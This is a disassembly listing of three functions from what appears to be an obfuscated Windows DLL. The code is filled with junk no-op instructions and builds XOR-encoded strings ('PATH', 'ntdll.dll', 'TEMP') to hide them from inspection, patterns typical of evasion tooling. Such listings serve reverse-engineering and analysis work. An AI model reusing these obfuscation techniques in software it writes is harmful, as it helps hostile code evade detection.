   180004899:	48 89 c1             	mov    %rax,%rcx
   18000489c:	ff 15 ee 18 02 00    	call   *0x218ee(%rip)        # 0x180026190
   1800048a2:	c7 44 24 30 36 c4 a3 	movl   $0xa3c436,0x30(%rsp)
   1800048a9:	00 
   1800048aa:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800048ae:	4d 87 db             	xchg   %r11,%r11
   1800048b1:	48 89 ed             	mov    %rbp,%rbp
   1800048b4:	4d 8d 3f             	lea    (%r15),%r15
   1800048b7:	4d 87 ed             	xchg   %r13,%r13
   1800048ba:	4d 89 e4             	mov    %r12,%r12
   1800048bd:	90                   	nop
   1800048be:	90                   	nop
   1800048bf:	4d 89 db             	mov    %r11,%r11
   1800048c2:	48 89 ff             	mov    %rdi,%rdi
   1800048c5:	53                   	push   %rbx
   1800048c6:	4d 8d 3f             	lea    (%r15),%r15
   1800048c9:	5b                   	pop    %rbx
   1800048ca:	e8 31 d5 ff ff       	call   0x180001e00
   1800048cf:	50                   	push   %rax
   1800048d0:	48 87 c9             	xchg   %rcx,%rcx
   1800048d3:	58                   	pop    %rax
   1800048d4:	b8 01 00 00 00       	mov    $0x1,%eax
   1800048d9:	48 83 c4 38          	add    $0x38,%rsp
   1800048dd:	c3                   	ret
   1800048de:	66 90                	xchg   %ax,%ax
   1800048e0:	56                   	push   %rsi
   1800048e1:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   1800048e8:	c7 44 24 5c 57 00 00 	movl   $0x57,0x5c(%rsp)
   1800048ef:	00 
   1800048f0:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   1800048f4:	4d 8d 3f             	lea    (%r15),%r15
   1800048f7:	b9 c1 01 00 00       	mov    $0x1c1,%ecx
   1800048fc:	e8 ef cb ff ff       	call   0x1800014f0
   180004901:	4d 8d 09             	lea    (%r9),%r9
   180004904:	e8 67 d3 ff ff       	call   0x180001c70
   180004909:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000490c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   180004911:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180004916:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000491b:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180004922:	00 
   180004923:	4c 8d 05 4c df 01 00 	lea    0x1df4c(%rip),%r8        # 0x180022876
   18000492a:	31 c9                	xor    %ecx,%ecx
   18000492c:	31 d2                	xor    %edx,%edx
   18000492e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180004934:	ff 15 96 19 02 00    	call   *0x21996(%rip)        # 0x1800262d0
   18000493a:	4d 89 f6             	mov    %r14,%r14
   18000493d:	48 89 c9             	mov    %rcx,%rcx
   180004940:	48 89 e4             	mov    %rsp,%rsp
   180004943:	4d 8d 24 24          	lea    (%r12),%r12
   180004947:	4d 8d 12             	lea    (%r10),%r10
   18000494a:	41 55                	push   %r13
   18000494c:	41 5d                	pop    %r13
   18000494e:	48 8b 35 0b 18 02 00 	mov    0x2180b(%rip),%rsi        # 0x180026160
   180004955:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000495a:	ff d6                	call   *%rsi
   18000495c:	48 89 c1             	mov    %rax,%rcx
   18000495f:	ff 15 83 17 02 00    	call   *0x21783(%rip)        # 0x1800260e8
   180004965:	4d 89 ff             	mov    %r15,%r15
   180004968:	4d 89 c0             	mov    %r8,%r8
   18000496b:	48 87 db             	xchg   %rbx,%rbx
   18000496e:	4d 89 db             	mov    %r11,%r11
   180004971:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180004976:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000497b:	ff 15 07 18 02 00    	call   *0x21807(%rip)        # 0x180026188
   180004981:	48 8d 3f             	lea    (%rdi),%rdi
   180004984:	4d 87 ed             	xchg   %r13,%r13
   180004987:	4d 8d 12             	lea    (%r10),%r10
   18000498a:	48 87 c9             	xchg   %rcx,%rcx
   18000498d:	e8 ae da ff ff       	call   0x180002440
   180004992:	48 89 d2             	mov    %rdx,%rdx
   180004995:	4d 87 db             	xchg   %r11,%r11
   180004998:	4d 89 c9             	mov    %r9,%r9
   18000499b:	4d 87 e4             	xchg   %r12,%r12
   18000499e:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1800049a3:	ff d6                	call   *%rsi
   1800049a5:	53                   	push   %rbx
   1800049a6:	5b                   	pop    %rbx
   1800049a7:	41 54                	push   %r12
   1800049a9:	4d 89 c9             	mov    %r9,%r9
   1800049ac:	41 5c                	pop    %r12
   1800049ae:	e8 cd e4 ff ff       	call   0x180002e80
   1800049b3:	c7 44 24 60 55 57 36 	movl   $0x365755,0x60(%rsp)
   1800049ba:	00 
   1800049bb:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800049bf:	52                   	push   %rdx
   1800049c0:	56                   	push   %rsi
   1800049c1:	5e                   	pop    %rsi
   1800049c2:	5a                   	pop    %rdx
   1800049c3:	e8 b8 c6 ff ff       	call   0x180001080
   1800049c8:	41 56                	push   %r14
   1800049ca:	90                   	nop
   1800049cb:	41 5e                	pop    %r14
   1800049cd:	b9 b0 01 00 00       	mov    $0x1b0,%ecx
   1800049d2:	e8 79 d8 ff ff       	call   0x180002250
   1800049d7:	48 8d 12             	lea    (%rdx),%rdx
   1800049da:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800049df:	ff 15 23 18 02 00    	call   *0x21823(%rip)        # 0x180026208
   1800049e5:	41 50                	push   %r8
   1800049e7:	41 58                	pop    %r8
   1800049e9:	c7 44 24 58 31 00 00 	movl   $0x31,0x58(%rsp)
   1800049f0:	00 
   1800049f1:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800049f5:	83 f0 61             	xor    $0x61,%eax
   1800049f8:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   1800049fd:	8b 44 24 58          	mov    0x58(%rsp),%eax
   180004a01:	83 f0 70             	xor    $0x70,%eax
   180004a04:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   180004a09:	8b 44 24 58          	mov    0x58(%rsp),%eax
   180004a0d:	83 f0 65             	xor    $0x65,%eax
   180004a10:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   180004a15:	8b 44 24 58          	mov    0x58(%rsp),%eax
   180004a19:	83 f0 79             	xor    $0x79,%eax
   180004a1c:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180004a21:	66 c7 44 24 54 00 00 	movw   $0x0,0x54(%rsp)
   180004a28:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   180004a2d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180004a32:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180004a38:	ff 15 9a 16 02 00    	call   *0x2169a(%rip)        # 0x1800260d8
   180004a3e:	48 87 ed             	xchg   %rbp,%rbp
   180004a41:	90                   	nop
   180004a42:	90                   	nop
   180004a43:	90                   	nop
   180004a44:	4d 8d 36             	lea    (%r14),%r14
   180004a47:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004a4b:	48 89 e4             	mov    %rsp,%rsp
   180004a4e:	c7 44 24 4c 85 00 00 	movl   $0x85,0x4c(%rsp)
   180004a55:	00 
   180004a56:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004a5a:	35 eb 00 00 00       	xor    $0xeb,%eax
   180004a5f:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   180004a64:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004a68:	35 f1 00 00 00       	xor    $0xf1,%eax
   180004a6d:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   180004a72:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004a76:	35 e1 00 00 00       	xor    $0xe1,%eax
   180004a7b:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180004a80:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004a84:	35 e9 00 00 00       	xor    $0xe9,%eax
   180004a89:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180004a8e:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004a92:	35 e9 00 00 00       	xor    $0xe9,%eax
   180004a97:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   180004a9c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004aa0:	35 ab 00 00 00       	xor    $0xab,%eax
   180004aa5:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   180004aaa:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004aae:	35 e1 00 00 00       	xor    $0xe1,%eax
   180004ab3:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   180004ab8:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004abc:	35 e9 00 00 00       	xor    $0xe9,%eax
   180004ac1:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180004ac6:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004aca:	35 e9 00 00 00       	xor    $0xe9,%eax
   180004acf:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   180004ad4:	66 c7 44 24 72 00 00 	movw   $0x0,0x72(%rsp)
   180004adb:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180004ae0:	ff 15 4a 16 02 00    	call   *0x2164a(%rip)        # 0x180026130
   180004ae6:	4d 8d 00             	lea    (%r8),%r8
   180004ae9:	48 89 c0             	mov    %rax,%rax
   180004aec:	4d 8d 36             	lea    (%r14),%r14
   180004aef:	4d 87 e4             	xchg   %r12,%r12
   180004af2:	48 87 db             	xchg   %rbx,%rbx
   180004af5:	ff 15 ad 15 02 00    	call   *0x215ad(%rip)        # 0x1800260a8
   180004afb:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004aff:	48 87 f6             	xchg   %rsi,%rsi
   180004b02:	c7 44 24 60 b6 45 cf 	movl   $0xcf45b6,0x60(%rsp)
   180004b09:	00 
   180004b0a:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180004b0e:	4d 89 f6             	mov    %r14,%r14
   180004b11:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004b15:	48 89 e4             	mov    %rsp,%rsp
   180004b18:	4d 89 db             	mov    %r11,%r11
   180004b1b:	4d 8d 24 24          	lea    (%r12),%r12
   180004b1f:	4d 87 c0             	xchg   %r8,%r8
   180004b22:	4d 8d 12             	lea    (%r10),%r10
   180004b25:	4d 89 d2             	mov    %r10,%r10
   180004b28:	4d 8d 24 24          	lea    (%r12),%r12
   180004b2c:	90                   	nop
   180004b2d:	90                   	nop
   180004b2e:	48 87 f6             	xchg   %rsi,%rsi
   180004b31:	31 c0                	xor    %eax,%eax
   180004b33:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   180004b3a:	5e                   	pop    %rsi
   180004b3b:	c3                   	ret
   180004b3c:	0f 1f 40 00          	nopl   0x0(%rax)
   180004b40:	56                   	push   %rsi
   180004b41:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180004b48:	b9 23 01 00 00       	mov    $0x123,%ecx
   180004b4d:	e8 4e d2 ff ff       	call   0x180001da0
   180004b52:	48 89 ed             	mov    %rbp,%rbp
   180004b55:	4d 87 d2             	xchg   %r10,%r10
   180004b58:	4d 89 c0             	mov    %r8,%r8
   180004b5b:	4d 87 ed             	xchg   %r13,%r13
   180004b5e:	90                   	nop
   180004b5f:	90                   	nop
   180004b60:	ff 15 5a 15 02 00    	call   *0x2155a(%rip)        # 0x1800260c0
   180004b66:	89 c6                	mov    %eax,%esi
   180004b68:	ff 15 2a 16 02 00    	call   *0x2162a(%rip)        # 0x180026198
   180004b6e:	31 f0                	xor    %esi,%eax
   180004b70:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004b74:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004b78:	48 8d 1b             	lea    (%rbx),%rbx
   180004b7b:	90                   	nop
   180004b7c:	90                   	nop
   180004b7d:	90                   	nop
   180004b7e:	90                   	nop
   180004b7f:	48 8d 36             	lea    (%rsi),%rsi
   180004b82:	48 87 db             	xchg   %rbx,%rbx
   180004b85:	4d 87 db             	xchg   %r11,%r11
   180004b88:	48 89 c9             	mov    %rcx,%rcx
   180004b8b:	e8 10 cc ff ff       	call   0x1800017a0
   180004b90:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180004b95:	b9 04 01 00 00       	mov    $0x104,%ecx
   180004b9a:	ff 15 00 15 02 00    	call   *0x21500(%rip)        # 0x1800260a0
   180004ba0:	48 8d 36             	lea    (%rsi),%rsi
   180004ba3:	4d 89 f6             	mov    %r14,%r14
   180004ba6:	e8 55 d2 ff ff       	call   0x180001e00
   180004bab:	48 89 db             	mov    %rbx,%rbx
   180004bae:	4d 87 ed             	xchg   %r13,%r13
   180004bb1:	4d 8d 12             	lea    (%r10),%r10
   180004bb4:	48 87 e4             	xchg   %rsp,%rsp
   180004bb7:	4d 8d 3f             	lea    (%r15),%r15
   180004bba:	90                   	nop
   180004bbb:	ff 15 37 15 02 00    	call   *0x21537(%rip)        # 0x1800260f8
   180004bc1:	41 56                	push   %r14
   180004bc3:	41 5e                	pop    %r14
   180004bc5:	48 87 ff             	xchg   %rdi,%rdi
   180004bc8:	4d 87 db             	xchg   %r11,%r11
   180004bcb:	48 8d 1b             	lea    (%rbx),%rbx
   180004bce:	c7 44 24 30 fd c2 05 	movl   $0x5c2fd,0x30(%rsp)
   180004bd5:	00 
   180004bd6:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004bda:	56                   	push   %rsi
   180004bdb:	5e                   	pop    %rsi
   180004bdc:	b9 4d 02 00 00       	mov    $0x24d,%ecx
   180004be1:	e8 da cd ff ff       	call   0x1800019c0
   180004be6:	51                   	push   %rcx
   180004be7:	4d 89 db             	mov    %r11,%r11
   180004bea:	59                   	pop    %rcx
   180004beb:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   180004bf0:	ff 15 6a 15 02 00    	call   *0x2156a(%rip)        # 0x180026160
   180004bf6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004bfb:	ff 15 37 15 02 00    	call   *0x21537(%rip)        # 0x180026138
   180004c01:	48 87 ff             	xchg   %rdi,%rdi
   180004c04:	ff 15 c6 14 02 00    	call   *0x214c6(%rip)        # 0x1800260d0
   180004c0a:	48 85 c0             	test   %rax,%rax
   180004c0d:	74 09                	je     0x180004c18
   180004c0f:	48 89 c1             	mov    %rax,%rcx
   180004c12:	ff 15 48 14 02 00    	call   *0x21448(%rip)        # 0x180026060
   180004c18:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004c1d:	ba 04 01 00 00       	mov    $0x104,%edx
   180004c22:	ff 15 48 15 02 00    	call   *0x21548(%rip)        # 0x180026170
   180004c28:	53                   	push   %rbx
   180004c29:	5b                   	pop    %rbx
   180004c2a:	41 52                	push   %r10
   180004c2c:	4d 87 ed             	xchg   %r13,%r13
   180004c2f:	41 5a                	pop    %r10
   180004c31:	c7 44 24 30 fa c1 80 	movl   $0x80c1fa,0x30(%rsp)
   180004c38:	00 
   180004c39:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004c3d:	53                   	push   %rbx
   180004c3e:	50                   	push   %rax
   180004c3f:	58                   	pop    %rax
   180004c40:	5b                   	pop    %rbx
   180004c41:	4d 89 db             	mov    %r11,%r11
   180004c44:	90                   	nop
   180004c45:	90                   	nop
   180004c46:	90                   	nop
   180004c47:	e8 94 cd ff ff       	call   0x1800019e0
   180004c4c:	52                   	push   %rdx
   180004c4d:	56                   	push   %rsi
   180004c4e:	5e                   	pop    %rsi
   180004c4f:	5a                   	pop    %rdx
   180004c50:	b9 49 01 00 00       	mov    $0x149,%ecx
   180004c55:	e8 96 c6 ff ff       	call   0x1800012f0
   180004c5a:	ff 15 28 14 02 00    	call   *0x21428(%rip)        # 0x180026088
   180004c60:	56                   	push   %rsi
   180004c61:	5e                   	pop    %rsi
   180004c62:	ff 15 08 14 02 00    	call   *0x21408(%rip)        # 0x180026070
   180004c68:	41 50                	push   %r8
   180004c6a:	41 58                	pop    %r8
   180004c6c:	c7 44 24 20 9f 00 00 	movl   $0x9f,0x20(%rsp)
   180004c73:	00 
   180004c74:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004c78:	35 cb 00 00 00       	xor    $0xcb,%eax
   180004c7d:	66 89 44 24 26       	mov    %ax,0x26(%rsp)
   180004c82:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004c86:	35 da 00 00 00       	xor    $0xda,%eax
   180004c8b:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180004c90:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004c94:	35 d2 00 00 00       	xor    $0xd2,%eax
   180004c99:	66 89 44 24 2a       	mov    %ax,0x2a(%rsp)
   180004c9e:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004ca2:	35 cf 00 00 00       	xor    $0xcf,%eax
   180004ca7:	66 89 44 24 2c       	mov    %ax,0x2c(%rsp)
   180004cac:	66 c7 44 24 2e 00 00 	movw   $0x0,0x2e(%rsp)
   180004cb3:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180004cb8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180004cbd:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180004cc3:	ff 15 0f 14 02 00    	call   *0x2140f(%rip)        # 0x1800260d8
   180004cc9:	90                   	nop
   180004cca:	48 8d 1b             	lea    (%rbx),%rbx
   180004ccd:	90                   	nop
   180004cce:	90                   	nop
   180004ccf:	90                   	nop
   180004cd0:	4d 89 f6             	mov    %r14,%r14
   180004cd3:	4d 87 ff             	xchg   %r15,%r15
   180004cd6:	4d 8d 00             	lea    (%r8),%r8
   180004cd9:	48 89 ed             	mov    %rbp,%rbp
   180004cdc:	4d 8d 24 24          	lea    (%r12),%r12
   180004ce0:	e8 4b c5 ff ff       	call   0x180001230
   180004ce5:	c7 44 24 30 73 46 0f 	movl   $0xf4673,0x30(%rsp)
   180004cec:	00 
   180004ced:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004cf1:	55                   	push   %rbp
   180004cf2:	4d 87 d2             	xchg   %r10,%r10
   180004cf5:	4d 87 f6             	xchg   %r14,%r14
   180004cf8:	5d                   	pop    %rbp
   180004cf9:	48 87 db             	xchg   %rbx,%rbx
   180004cfc:	48 8d 00             	lea    (%rax),%rax
   180004cff:	48 89 ed             	mov    %rbp,%rbp
   180004d02:	4d 8d 00             	lea    (%r8),%r8
   180004d05:	48 8d 09             	lea    (%rcx),%rcx
   180004d08:	48 89 c0             	mov    %rax,%rax
   180004d0b:	4d 87 e4             	xchg   %r12,%r12
   180004d0e:	90                   	nop
   180004d0f:	c7 44 24 26 2e 00 00 	movl   $0x2e,0x26(%rsp)
   180004d16:	00 
   180004d17:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180004d1c:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180004d21:	ba 04 01 00 00       	mov    $0x104,%edx
   180004d26:	45 31 c9             	xor    %r9d,%r9d
   180004d29:	ff 15 c1 13 02 00    	call   *0x213c1(%rip)        # 0x1800260f0
   180004d2f:	90                   	nop
   180004d30:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180004d37:	5e                   	pop    %rsi
   180004d38:	c3                   	ret
   180004d39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004d40:	56                   	push   %rsi
   180004d41:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180004d48:	b9 e1 01 00 00       	mov    $0x1e1,%ecx
   180004d4d:	e8 6e cd ff ff       	call   0x180001ac0
   180004d52:	41 50                	push   %r8
   180004d54:	41 53                	push   %r11
   180004d56:	41 5b                	pop    %r11
   180004d58:	41 58                	pop    %r8
   180004d5a:	e8 d1 c4 ff ff       	call   0x180001230
   180004d5f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004d64:	ff 15 96 13 02 00    	call   *0x21396(%rip)        # 0x180026100
   180004d6a:	90                   	nop
   180004d6b:	48 8d 1b             	lea    (%rbx),%rbx
   180004d6e:	90                   	nop
   180004d6f:	41 55                	push   %r13
   180004d71:	4d 89 f6             	mov    %r14,%r14
   180004d74:	41 5d                	pop    %r13
   180004d76:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004d7b:	ff 15 1f 14 02 00    	call   *0x2141f(%rip)        # 0x1800261a0
   180004d81:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004d86:	ba 04 01 00 00       	mov    $0x104,%edx
   180004d8b:	ff 15 27 14 02 00    	call   *0x21427(%rip)        # 0x1800261b8
   180004d91:	48 87 e4             	xchg   %rsp,%rsp
   180004d94:	90                   	nop
   180004d95:	c7 44 24 30 1d 67 2f 	movl   $0x2f671d,0x30(%rsp)
   180004d9c:	00 
   180004d9d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004da1:	51                   	push   %rcx
   180004da2:	59                   	pop    %rcx
   180004da3:	52                   	push   %rdx
   180004da4:	5a                   	pop    %rdx
   180004da5:	52                   	push   %rdx
   180004da6:	90                   	nop
   180004da7:	5a                   	pop    %rdx
   180004da8:	57                   	push   %rdi
   180004da9:	41 54                	push   %r12
   180004dab:	41 5c                	pop    %r12
   180004dad:	5f                   	pop    %rdi
   180004dae:	48 8d 12             	lea    (%rdx),%rdx
   180004db1:	48 87 d2             	xchg   %rdx,%rdx
   180004db4:	4d 87 db             	xchg   %r11,%r11
   180004db7:	48 89 ed             	mov    %rbp,%rbp
   180004dba:	4d 87 ed             	xchg   %r13,%r13
   180004dbd:	b9 1b 03 00 00       	mov    $0x31b,%ecx
   180004dc2:	e8 29 c7 ff ff       	call   0x1800014f0
   180004dc7:	48 87 d2             	xchg   %rdx,%rdx
   180004dca:	4d 8d 36             	lea    (%r14),%r14
   180004dcd:	4d 87 d2             	xchg   %r10,%r10
   180004dd0:	c7 44 24 30 40 00 00 	movl   $0x40,0x30(%rsp)
   180004dd7:	00 
   180004dd8:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   180004ddd:	48 89 f1             	mov    %rsi,%rcx
   180004de0:	ff 15 da 13 02 00    	call   *0x213da(%rip)        # 0x1800261c0
   180004de6:	41 54                	push   %r12
   180004de8:	4d 8d 1b             	lea    (%r11),%r11
   180004deb:	48 87 ff             	xchg   %rdi,%rdi
   180004dee:	41 5c                	pop    %r12
   180004df0:	48 8d 0d 67 da 01 00 	lea    0x1da67(%rip),%rcx        # 0x18002285e
   180004df7:	ff 15 23 13 02 00    	call   *0x21323(%rip)        # 0x180026120
   180004dfd:	90                   	nop
   180004dfe:	90                   	nop
   180004dff:	ff 15 4b 13 02 00    	call   *0x2134b(%rip)        # 0x180026150
   180004e05:	51                   	push   %rcx
   180004e06:	59                   	pop    %rcx
   180004e07:	ff 15 8b 12 02 00    	call   *0x2128b(%rip)        # 0x180026098
   180004e0d:	90                   	nop
   180004e0e:	4d 8d 3f             	lea    (%r15),%r15
   180004e11:	c7 44 24 30 63 32 6a 	movl   $0x6a3263,0x30(%rsp)
   180004e18:	00 
   180004e19:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004e1d:	48 89 ed             	mov    %rbp,%rbp
   180004e20:	4d 87 e4             	xchg   %r12,%r12
   180004e23:	b9 21 03 00 00       	mov    $0x321,%ecx
   180004e28:	e8 63 c9 ff ff       	call   0x180001790
   180004e2d:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   180004e32:	ff 15 d8 13 02 00    	call   *0x213d8(%rip)        # 0x180026210
   180004e38:	4d 89 d2             	mov    %r10,%r10
   180004e3b:	90                   	nop
   180004e3c:	31 c9                	xor    %ecx,%ecx
   180004e3e:	ff 15 ec 12 02 00    	call   *0x212ec(%rip)        # 0x180026130
   180004e44:	48 87 c9             	xchg   %rcx,%rcx
   180004e47:	4d 87 ed             	xchg   %r13,%r13
   180004e4a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180004e4f:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180004e56:	00 
   180004e57:	4c 8d 05 fe d9 01 00 	lea    0x1d9fe(%rip),%r8        # 0x18002285c
   180004e5e:	31 c9                	xor    %ecx,%ecx
   180004e60:	31 d2                	xor    %edx,%edx
   180004e62:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180004e68:	ff 15 d2 13 02 00    	call   *0x213d2(%rip)        # 0x180026240
   180004e6e:	48 87 ed             	xchg   %rbp,%rbp
   180004e71:	90                   	nop
   180004e72:	c7 44 24 30 8e ca 55 	movl   $0x55ca8e,0x30(%rsp)
   180004e79:	00 
   180004e7a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004e7e:	48 8d 1b             	lea    (%rbx),%rbx
   180004e81:	48 8d 36             	lea    (%rsi),%rsi
   180004e84:	48 89 c0             	mov    %rax,%rax
   180004e87:	48 89 ff             	mov    %rdi,%rdi
   180004e8a:	48 89 db             	mov    %rbx,%rbx
   180004e8d:	4d 87 e4             	xchg   %r12,%r12
   180004e90:	4d 8d 36             	lea    (%r14),%r14
   180004e93:	4d 89 c0             	mov    %r8,%r8
   180004e96:	4d 87 db             	xchg   %r11,%r11
   180004e99:	31 c0                	xor    %eax,%eax
   180004e9b:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180004ea2:	5e                   	pop    %rsi
   180004ea3:	c3                   	ret
   180004ea4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
